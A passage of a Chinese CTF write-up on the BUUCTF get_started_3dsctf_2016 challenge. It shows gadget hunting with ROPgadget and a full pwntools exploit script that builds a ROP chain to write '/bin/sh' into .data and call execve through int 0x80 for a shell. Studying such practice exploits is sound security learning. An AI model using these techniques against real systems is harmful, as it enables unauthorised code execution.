+<p>通过<code>ROPgadget --binary get_started_3dsctf_2016 --only &quot;mov|ret&quot;</code>命令然后我们找到了这个可用的 gadget：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># dword表示双字，就是四个字节，刚好是32位寄存器的大小</span>
+</span></span><span class="line"><span class="cl">0x080557ab : mov dword ptr <span class="o">[</span>edx<span class="o">]</span>, eax <span class="p">;</span> ret
+</span></span></code></pre></div><p>然后我们可以直接利用之前找到过的<code>pop edx;pop ecx;pop ebx;ret</code>将地址弹到 edx 中</p>
+<p>然后我们用 ida 找到一块闲置空间（一直滚到.data 段，最后有一小段重复的 db 0）</p>
+<p><img src="../../image/202209080117042022-09-08-01-17-04.png" alt="202209080117042022-09-08-01-17-04"></p>
+<p>然后我们就可以完成我们的 payload 了：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">pop_eax_ret</span> <span class="o">=</span> <span class="mh">0x080b91e6</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_edx_ecx_ebx_ret</span> <span class="o">=</span> <span class="mh">0x0806fc30</span>
+</span></span><span class="line"><span class="cl"><span class="n">int80</span> <span class="o">=</span> <span class="mh">0x0806d7e5</span>
+</span></span><span class="line"><span class="cl"><span class="n">mov_edx_eax_ret</span> <span class="o">=</span> <span class="mh">0x080557ab</span>
+</span></span><span class="line"><span class="cl"><span class="n">spare_space</span> <span class="o">=</span> <span class="mh">0x080EB0C0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x38</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">pop_eax_ret</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s2">&#34;/bin&#34;</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">pop_edx_ecx_ebx_ret</span><span class="p">)</span> <span class="o">+</span> \
+</span></span><span class="line"><span class="cl">    <span class="n">pg</span><span class="p">(</span><span class="n">spare_space</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">mov_ecx_eax_ret</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">pg</span><span class="p">(</span><span class="n">pop_eax_ret</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">pop_edx_ecx_ebx_ret</span><span class="p">)</span> <span class="o">+</span> \
+</span></span><span class="line"><span class="cl">    <span class="n">pg</span><span class="p">(</span><span class="n">spare_space</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">mov_edx_eax_ret</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">pg</span><span class="p">(</span><span class="n">pop_eax_ret</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="mh">0xb</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">pop_edx_ecx_ebx_ret</span><span class="p">)</span> <span class="o">+</span> \
+</span></span><span class="line"><span class="cl">    <span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">spare_space</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">int80</span><span class="p">)</span>
+</span></span></code></pre></div><h4 id="完整-exp2">完整 exp2</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">p64</span><span class="p">,</span> <span class="n">p32</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pss</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl"><span class="n">fn</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;./get_started_3dsctf_2016&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># libc_name: str = &#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">port</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">if_32</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl"><span class="n">pg</span> <span class="o">=</span> <span class="n">p32</span> <span class="k">if</span> <span class="n">if_32</span> <span class="k">else</span> <span class="n">p64</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&#34;debug&#34;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s2">&#34;i386&#34;</span> <span class="k">if</span> <span class="n">if_32</span> <span class="k">else</span> <span class="s2">&#34;amd64&#34;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s2">&#34;linux&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">if_debug</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">pss</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node4.buuoj.cn&#34;</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">if_debug</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">shell</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="n">fn</span><span class="p">,</span> <span class="s2">&#34;b* 0x8048A40&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">fn</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pop_eax_ret</span> <span class="o">=</span> <span class="mh">0x080b91e6</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_edx_ecx_ebx_ret</span> <span class="o">=</span> <span class="mh">0x0806fc30</span>
+</span></span><span class="line"><span class="cl"><span class="n">int80</span> <span class="o">=</span> <span class="mh">0x0806d7e5</span>
+</span></span><span class="line"><span class="cl"><span class="n">mov_edx_eax_ret</span> <span class="o">=</span> <span class="mh">0x080557ab</span>
+</span></span><span class="line"><span class="cl"><span class="n">spare_space</span> <span class="o">=</span> <span class="mh">0x080EB0C0</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_edx_ret</span> <span class="o">=</span> <span class="mh">0x0806fc0a</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_ecx_ebx_ret</span> <span class="o">=</span> <span class="mh">0x0806fc31</span>
+</span></span><span class="line"><span class="cl"><span class="n">mov_ecx_eax_ret</span> <span class="o">=</span> <span class="mh">0x080701a5</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x38</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">pop_eax_ret</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s2">&#34;/bin&#34;</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">pop_edx_ecx_ebx_ret</span><span class="p">)</span> <span class="o">+</span> \
+</span></span><span class="line"><span class="cl">    <span class="n">pg</span><span class="p">(</span><span class="n">spare_space</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">mov_edx_eax_ret</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">pg</span><span class="p">(</span><span class="n">pop_eax_ret</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">pop_edx_ecx_ebx_ret</span><span class="p">)</span> <span class="o">+</span> \
+</span></span><span class="line"><span class="cl">    <span class="n">pg</span><span class="p">(</span><span class="n">spare_space</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">mov_edx_eax_ret</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">pg</span><span class="p">(</span><span class="n">pop_eax_ret</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="mh">0xb</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">pop_edx_ecx_ebx_ret</span><span class="p">)</span> <span class="o">+</span> \
+</span></span><span class="line"><span class="cl">    <span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">spare_space</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">int80</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">if_debug</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">shell</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">shell</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><h4 id="一些悬而未决的小问题">一些悬而未决的小问题</h4>
+<h5 id="作者试图不使用pop-edxpop-ecxpop-ebxret只使用pop-edxret">作者试图不使用<code>pop edx;pop ecx;pop ebx;ret</code>只使用<code>pop edx;ret</code></h5>
+<blockquote>
+<p>我们用<code> ROPgadget --binary get_started_3dsctf_2016 --only &quot;pop|ret&quot;</code>命令找到了<code>pop edx</code>的命令</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">0x0806fc0a : pop edx <span class="p">;</span> ret
+</span></span></code></pre></div><p>看起来似乎没有问题</p>
+</blockquote>
+<p>令人疑惑的是，这样子连栈都没法写入(在 pop eax 后就是连串的 popal)，可能是我找的这个 gadget 本身有点小问题</p>
+<p>但是我尝试了<code>pop ecx;pop ebx;ret</code>和<code>mov [ecx+4], eax</code>，程序完全正常运作，可以正常得到 shell</p>
+<p>payload 如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">pop_eax_ret</span> <span class="o">=</span> <span class="mh">0x080b91e6</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_edx_ecx_ebx_ret</span> <span class="o">=</span> <span class="mh">0x0806fc30</span>
+</span></span><span class="line"><span class="cl"><span class="n">int80</span> <span class="o">=</span> <span class="mh">0x0806d7e5</span>
+</span></span><span class="line"><span class="cl"><span class="n">mov_edx_eax_ret</span> <span class="o">=</span> <span class="mh">0x080557ab</span>
+</span></span><span class="line"><span class="cl"><span class="n">spare_space</span> <span class="o">=</span> <span class="mh">0x080EB0C0</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_edx_ret</span> <span class="o">=</span> <span class="mh">0x0806fc0a</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_ecx_ebx_ret</span> <span class="o">=</span> <span class="mh">0x0806fc31</span>
+</span></span><span class="line"><span class="cl"><span class="n">mov_ecx_eax_ret</span> <span class="o">=</span> <span class="mh">0x080701a5</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 这里一定要-4，因为gadget加了4</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x38</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">pop_eax_ret</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s2">&#34;/bin&#34;</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">pop_ecx_ebx_ret</span><span class="p">)</span> <span class="o">+</span> \
+</span></span><span class="line"><span class="cl">    <span class="n">pg</span><span class="p">(</span><span class="n">spare_space</span><span class="o">-</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">mov_ecx_eax_ret</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">pg</span><span class="p">(</span><span class="n">pop_eax_ret</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">pop_edx_ecx_ebx_ret</span><span class="p">)</span> <span class="o">+</span> \
+</span></span><span class="line"><span class="cl">    <span class="n">pg</span><span class="p">(</span><span class="n">spare_space</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">mov_edx_eax_ret</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">pg</span><span class="p">(</span><span class="n">pop_eax_ret</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="mh">0xb</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">pop_edx_ecx_ebx_ret</span><span class="p">)</span> <span class="o">+</span> \
+</span></span><span class="line"><span class="cl">    <span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">spare_space</span><span class="p">)</span><span class="o">+</span><span class="n">pg</span><span class="p">(</span><span class="n">int80</span><span class="p">)</span>
+</span></span></code></pre></div><h5 id="无法执行其他二进制文件">无法执行其他二进制文件</h5>
+<p>作者一开始试图<code>execve(&quot;sh&quot;, 0, 0)</code>，但是查阅资料后明白只能执行二进制文件，于是又试图执行<code>/bin/ls</code>和<code>/usr/bin/python3.10</code>，但是均因不明原因失败了</p>
+<hr>
+<p>如果各位看官知道了原因，可以劳烦您在评论区为作者和后来人作一番解释吗？感激不尽！</p>
+
+</article>
+
+
+      
+        <div class="my-4">
+    
+    <a href="https://peterliuzhi.top/tags/pwn/" class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#pwn</a>
+    
+    <a href="https://peterliuzhi.top/tags/syscall/" class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#syscall</a>
+    
+</div>
+      
+
+      
+
+
+
+      
+
+      
+  <div
+    class="-mx-2 mt-4 flex flex-col border-t px-2 pt-4 md:flex-row md:justify-between"
+  >
+    <div>
+      
+        <span class="text-primary-text block font-bold"
+          >上一页</span
+        >
+        <a href="https://peterliuzhi.top/writeup/shell%E9%87%8D%E5%AE%9A%E5%90%91buuctf-wustctf2020_closed/" class="block">【shell重定向】BUUCTF wustctf2020_closed</a>
+      
+    </div>
+    <div class="mt-4 md:mt-0 md:text-right">
+      
+        <span class="text-primary-text block font-bold">下一页</span>
+        <a href="https://peterliuzhi.top/writeup/unlinkbuuctf-hitcontraining_unlink/" class="block">【unlink】BUUCTF hitcontraining_unlink</a>
+      
+    </div>
+  </div>
+
+
+      
+
+
+
+    </div>
+    
+      <div class="col-span-2">
+        
+        
+          <div
+  class="
+    bg-primary-bg
+   prose sticky top-16 z-10 hidden px-6 py-4 lg:block"
+>
+  <h3>本页内容</h3>
+</div>
+<div
+  class="sticky-toc  hidden px-6 pb-6 lg:block"
+>
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#syscallwrite-upbuuctf-get_started_3dsctf_2016">【syscall】【Write-up】BUUCTF Get_started_3dsctf_2016</a>
+      <ul>
+        <li><a href="#checksec-查看架构">checksec 查看架构</a></li>
+        <li><a href="#ida-查看程序伪代码">ida 查看程序（伪）代码</a>
+          <ul>
+            <li><a href="#main-函数">main 函数</a></li>
+            <li><a href="#后门函数">后门函数</a></li>
+          </ul>
+        </li>
+        <li><a href="#构建-exp">构建 exp</a>
+          <ul>
+            <li><a href="#通过后门函数构建-exp">通过后门函数构建 exp</a>
+              <ul>
+                <li><a href="#完整-exp1">完整 exp1</a></li>
+              </ul>
+            </li>
+            <li><a href="#通过-syscall-构建-exp">通过 syscall 构建 exp</a>
+              <ul>
+                <li><a href="#没有现成binsh构建字符串">没有现成<code>&quot;/bin/sh&quot;</code>：构建字符串</a></li>
+                <li><a href="#完整-exp2">完整 exp2</a></li>
+                <li><a href="#一些悬而未决的小问题">一些悬而未决的小问题</a>
+                  <ul>
+                    <li><a href="#作者试图不使用pop-edxpop-ecxpop-ebxret只使用pop-edxret">作者试图不使用<code>pop edx;pop ecx;pop ebx;ret</code>只使用<code>pop edx;ret</code></a></li>
+                    <li><a href="#无法执行其他二进制文件">无法执行其他二进制文件</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+</div>
+<script>
+  window.addEventListener("DOMContentLoaded", () => {
+    enableStickyToc();
+  });
+</script>
+
+        
+      </div>
+    
+
+    
+    
+      <div
+        class=" bg-secondary-bg prose col-span-2 rounded p-6 lg:col-span-6"
+      >
+        <h3>相关</h3>
+        
+          <a href="https://peterliuzhi.top/writeup/jarvisoj_level2_x64/" class="no-underline">BUUCTF Jarvisoj_level2_x64</a>
+          <br />
+        
+          <a href="https://peterliuzhi.top/writeup/ciscn_2019_ne_5/" class="no-underline">BUUCTF ciscn_2019_ne_5</a>
+          <br />
+        
+          <a href="https://peterliuzhi.top/writeup/32%E4%BD%8D%E7%B3%BB%E7%BB%9F%E4%BC%A0%E5%8F%82buuctf-picoctf_2018_rop-chain/" class="no-underline">【32位系统传参】BUUCTF picoctf_2018_rop chain</a>
+          <br />
+        
+          <a href="https://peterliuzhi.top/writeup/c&#43;&#43;pwnzjctf-2019login/" class="no-underline">【C&#43;&#43;Pwn】[ZJCTF 2019]Login</a>
+          <br />
+        
+          <a href="https://peterliuzhi.top/writeup/c%E5%86%85%E5%B5%8C%E6%B1%87%E7%BC%96others_shellcode/" class="no-underline">【C内嵌汇编】others_shellcode</a>
+          <br />
+        
+          <a href="https://peterliuzhi.top/writeup/harekazectf2019baby_rop/" class="no-underline">【HarekazeCTF2019】baby_rop</a>
+          <br />
+        
+      </div>
+    
+  </div>
+
+  
+    <script>
+      document.addEventListener("DOMContentLoaded", () => {
+        hljs.highlightAll();
+      });
+    </script>
+
+          </div>
+        </div>
+      
+    </main>
+    <footer class="pl-scrollbar">
+      <div class="mx-auto w-full max-w-screen-xl"><div class="text-center p-6 pin-b">
+    <p class="text-sm text-tertiary-text">&copy; 2023 <a href="https://github.com/PeterLiu-all">Peter Liu</a>
+ &middot;  Powered by the <a href="https://github.com/wangchucheng/hugo-eureka" class="hover:text-eureka">Eureka</a> theme for <a href="https://gohugo.io" class="hover:text-eureka">Hugo</a></p>
+</div>
+<link rel="stylesheet" href="../../css/copy-btn.css">
+<script src="../../js/copy-btn.js"></script></div>
+    </footer>
+  </body>
+</html>
